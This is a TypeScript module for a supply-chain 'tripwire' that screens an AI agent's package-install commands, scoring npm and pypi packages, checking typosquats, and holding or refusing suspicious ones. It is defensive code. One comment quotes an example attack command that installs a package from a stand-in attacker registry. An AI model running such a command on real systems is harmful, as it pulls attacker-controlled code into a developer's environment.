// The tripwire as a service: one Bash command in, one gate outcome out. It owns the order of
// work (parse → read files → private config → overrides → cached verdicts → investigations →
// facts → decide) and touches the outside world only through ports, so hooks/gate.ts stays a
// thin translation and this file is unit-tested in vitest against the recorded fixtures.

import { key, nameKey } from '../core/model'
import type { Ecosystem, InstallRequest, Investigation, Override, PackageCheck, PackageRef, Signal } from '../core/model'
import { matchOverride } from '../core/overrides'
import { expandRequest, filesNeeded, parseCommand, pinnedToken, rewriteCommand } from '../core/parse/index'
import { decide, decideCommand, isAllowed, scorePackage, VERDICT_TTL_MS } from '../core/score/tier'
import type { Mode } from '../core/score/tier'
import { buildTyposquatIndex } from '../core/score/typosquat'
import type { TyposquatIndex } from '../core/score/typosquat'
import { popularNpm } from '../core/data/popular-npm'
import { popularPypi } from '../core/data/popular-pypi'
import {
  commandText,
  heldText,
  investigationFailedText,
  blockedText,
  pinnedText,
  refusedText,
  sentinelRefusedText,
} from '../core/text/deny-text'
import { cacheGet, cacheSet } from './cache'
import { gatherFacts } from './facts'
import type { EnvPort, ReadFilePort, SourceIo } from './ports'
import { isPublicRegistry, loadPrivateConfig } from './project-config'

export type TripwireIo = SourceIo & {
  readFile: ReadFilePort
  env: EnvPort
  /** The session's working directory for config lookups ('.' when relative paths suffice). */
  cwd: string
  overrides: () => Promise<{ session: Record<string, Override>; permanent: Record<string, Override> }>
  investigations: () => Promise<Record<string, Investigation>>
}

export type TripwireOptions = {
  mode: Mode
  allowlist: string[]
  popular?: Record<Ecosystem, TyposquatIndex>
}

export type Checked = { request: InstallRequest; check: PackageCheck }

export type GateOutcome =
  | { kind: 'not-install' }
  | {
      kind: 'allow' | 'deny'
      requests: InstallRequest[]
      checks: Checked[]
      /** Packages newly held this call: the Sentinel should investigate these. */
      toInvestigate: PackageCheck[]
      /** Deny text (deny) or warnings for the agent's context (allow in warn-only). */
      text: string
      /** FR-035: the command to run instead, when cooldown pins rewrote it. */
      rewrite?: string
      /** Fragments the parser could not read: allowed, and flagged on the map (FR-003). */
      unchecked: { request: InstallRequest; fragment: string }[]
    }

const NPM_TOOLS = new Set(['npm', 'pnpm', 'yarn', 'bun', 'npx'])
export const ecosystemOf = (r: InstallRequest): Ecosystem | undefined =>
  NPM_TOOLS.has(r.tool) ? 'npm' : r.tool === 'shell' ? undefined : 'pypi'

let defaultPopular: Record<Ecosystem, TyposquatIndex> | undefined
const popularIndexes = (): Record<Ecosystem, TyposquatIndex> =>
  (defaultPopular ??= { npm: buildTyposquatIndex(popularNpm, 'npm'), pypi: buildTyposquatIndex(popularPypi, 'pypi') })

/** Reads every file a request asks for, following nested includes, then completes it. */
const completeRequest = async (io: TripwireIo, request: InstallRequest): Promise<InstallRequest> => {
  if (request.source === 'explicit') return request
  const files: Record<string, string | null> = {}
  for (let round = 0; round < 32; round++) {
    const paths = filesNeeded(request, files)
    if (paths.length === 0) break
    await Promise.all(paths.map(async p => { files[p] = (await io.readFile(p).catch(() => undefined)) ?? null }))
  }
  return expandRequest(request, files)
}

/** A Sentinel past its deadline has timed out, whether or not its turn ever ended (FR-017). */
const current = (inv: Investigation | undefined, now: number): Investigation | undefined =>
  inv && (inv.status === 'queued' || inv.status === 'running') && now > inv.deadline
    ? { ...inv, status: 'timedOut', failure: inv.failure ?? `no verdict within ${Math.round((inv.deadline - inv.startedAt) / 1000)} s` }
    : inv

/**
 * What an investigation does to a package that fast-scored as held. Investigations only ever
 * resolve holds (FR-015): a package with a hard signal scores refuse and never gets here, so a
 * Sentinel "allow" can't clear it, however the investigation came about (code review, 2026-10-13).
 */
const resolveHold = (held: PackageCheck, inv: Investigation | undefined, now: number): { check: PackageCheck; dispatch: boolean } => {
  if (!inv) return { check: held, dispatch: true }
  if (inv.status === 'queued' || inv.status === 'running') return { check: held, dispatch: false }
  const base = { ref: held.ref, decidedAt: now, expiresAt: now + VERDICT_TTL_MS, decidedBy: 'sentinel' as const }
  if (inv.status === 'concluded' && inv.verdict) {
    const allowed = inv.verdict.verdict === 'allow' && !inv.hasHardSignal
    const signals: Signal[] = inv.verdict.evidence.map(e => ({ kind: 'malware', state: allowed ? 'absent' : 'present', weight: 'hard', evidence: e }))
    return { check: { ...base, tier: allowed ? 'pass' : 'refuse', signals }, dispatch: false }
  }
  // failed or timed out: fail closed; textFor picks the investigation-failed wording
  return { check: { ...base, tier: 'refuse', signals: [] }, dispatch: false }
}

const textFor = (check: PackageCheck, investigations: Record<string, Investigation>, now: number): string => {
  const inv = current(investigations[key(check.ref)], now)
  if (check.decidedBy === 'override') return blockedText(check.ref)
  if (check.decidedBy === 'sentinel' && inv && (inv.status === 'failed' || inv.status === 'timedOut')) {
    return investigationFailedText(check.ref, inv.status === 'failed' ? 'failed' : 'timed out', inv.failure ?? 'no verdict')
  }
  if (check.decidedBy === 'sentinel') return sentinelRefusedText(check.ref, check.signals.map(s => s.evidence))
  return check.tier === 'hold' ? heldText(check) : refusedText(check)
}

// An exact version (1.2.3, 2.0.0-rc.1), as opposed to a range or tag: only exact versions have a
// fixed verdict worth caching up front. `latest` moves, so it is always re-scored (code review)
const EXACT = /^v?\d+(\.\d+)*([-+][0-9A-Za-z.-]+)?$/
const isExact = (ref: PackageRef): boolean => ref.version !== undefined && EXACT.test(ref.version)

/** Evaluates one Bash command. Never throws for expected failures: unknowns stay unknown. */
export const evaluate = async (
  io: TripwireIo,
  command: string,
  agentId: string,
  options: TripwireOptions,
): Promise<GateOutcome> => {
  const now = await io.now()
  const parsed = parseCommand(command, agentId, now)
  if (parsed.length === 0) return { kind: 'not-install' }

  const requests = await Promise.all(parsed.map(r => completeRequest(io, r)))
  const unchecked = requests.flatMap(request => request.unchecked.map(fragment => ({ request, fragment })))
  const pending = requests.flatMap(request => {
    const eco = ecosystemOf(request)
    return eco ? request.packages.map(ref => ({ request, ref: { ...ref, ecosystem: eco } })) : []
  })
  if (pending.length === 0) {
    return { kind: 'allow', requests, checks: [], toInvestigate: [], text: '', unchecked }
  }

  // Registries named on the command line are the agent's choice, not the developer's config, so
  // they are never trusted as private: a package fetched from one is refused unless overridden
  // (code review, 2026-10-13: `npm i evil --registry https://attacker.example` used to pass)
  const commandLineRegistry = new Map<string, string>()
  for (const { request, ref } of pending) {
    const url = request.indexUrls?.find(u => !isPublicRegistry(ref.ecosystem, u))
    if (url) commandLineRegistry.set(key(ref), url)
  }
  const [config, overrides, investigations] = await Promise.all([
    loadPrivateConfig({ readFile: io.readFile, env: io.env, cwd: io.cwd, allowlist: options.allowlist.join(',') }),
    io.overrides(),
    io.investigations(),
  ])
  const popular = options.popular ?? popularIndexes()

  // Overrides and cached verdicts for exact versions settle a package without fetching
  const settled = new Map<string, PackageCheck>()
  const toFetch: PackageRef[] = []
  for (const { ref } of pending) {
    const k = key(ref)
    if (settled.has(k) || toFetch.some(r => key(r) === k)) continue
    const override = matchOverride(ref, overrides.session, overrides.permanent)
    if (override) {
      settled.set(k, decide({ ref, signals: [], now, override, mode: options.mode }))
      continue
    }
    if (isExact(ref) && !commandLineRegistry.has(k)) {
      const cached = await cacheGet<PackageCheck>(io, 'verdict', k)
      if (cached) { settled.set(k, { ...cached, decidedBy: 'cache' }); continue }
    }
    toFetch.push(ref)
  }

  const facts = toFetch.length ? await gatherFacts(io, toFetch, config) : []
  const toInvestigate: PackageCheck[] = []
  for (const raw of facts) {
    const k = key(raw.ref)
    const registry = commandLineRegistry.get(k)
    const f = registry ? { ...raw, commandLineRegistry: registry } : raw
    let check = scorePackage(f, now, popular[f.ref.ecosystem], { mode: options.mode })
    if (check.tier === 'hold') {
      const r = resolveHold(check, current(investigations[k], now), now)
      check = r.check
      if (r.dispatch) toInvestigate.push(check)
    }
    settled.set(k, check)
    if ((check.tier === 'pass' || check.tier === 'refuse') && check.decidedBy !== 'sentinel' && !registry) {
      // Cached under the version that resolved, so an exact request for it is instant next time
      const resolved = f.resolvedVersion !== 'unknown' && !isExact(f.ref) ? { ...f.ref, version: f.resolvedVersion } : f.ref
      if (isExact(resolved)) await cacheSet(io, 'verdict', key(resolved), { ...check, ref: resolved }, VERDICT_TTL_MS)
    }
  }

  const checks = pending.map(({ request, ref }) => ({ request, check: settled.get(key(ref))! }))
  const unique = [...new Map(checks.map(c => [key(c.check.ref), c.check])).values()]
  const warnings = options.mode === 'warn-only'
    ? unique.filter(c => (c.tier === 'refuse' || c.tier === 'hold') && isAllowed(c)).map(c => refusedText(c))
    : []

  // Cooldown pins (FR-035): splice the pinned spelling over each package's own token. A pin with
  // no span (from a requirements file or lockfile) can't be rewritten in the command, so it holds.
  const replacements: { span: [number, number]; text: string }[] = []
  const pinNotes: string[] = []
  for (const entry of checks) {
    const { request, check } = entry
    if (!check.pinnedTo) continue
    const span = request.spans?.[key(check.ref)]
    if (!span) {
      const { pinnedTo: _to, pinnedFrom: _from, ...rest } = check
      const r = resolveHold({ ...rest, tier: 'hold', decidedBy: 'fast-score' }, current(investigations[key(check.ref)], now), now)
      entry.check = r.check
      if (r.dispatch && !toInvestigate.some(c => key(c.ref) === key(check.ref))) toInvestigate.push(r.check)
      continue
    }
    replacements.push({ span, text: pinnedToken(check.ref, check.pinnedTo, request.tool) })
    pinNotes.push(pinnedText(check.ref, check.pinnedTo, check.pinnedFrom))
  }
  const final = decideCommand([...new Map(checks.map(c => [key(c.check.ref), c.check])).values()])
  const rewrite = final.allow && replacements.length > 0 ? rewriteCommand(command, replacements) : undefined
  return {
    kind: final.allow ? 'allow' : 'deny',
    requests,
    checks,
    toInvestigate: options.mode === 'warn-only' ? [] : toInvestigate,
    text: final.allow ? [...pinNotes, ...warnings].join('\n\n') : commandText(final.blocking, c => textFor(c, investigations, now)),
    ...(rewrite && rewrite !== command ? { rewrite } : {}),
    unchecked,
  }
}

/** Override keys use the name-only form unless a version was given (core/overrides.ts). */
export const overrideKeyFor = (ref: PackageRef): string => (ref.version ? key(ref) : nameKey(ref))
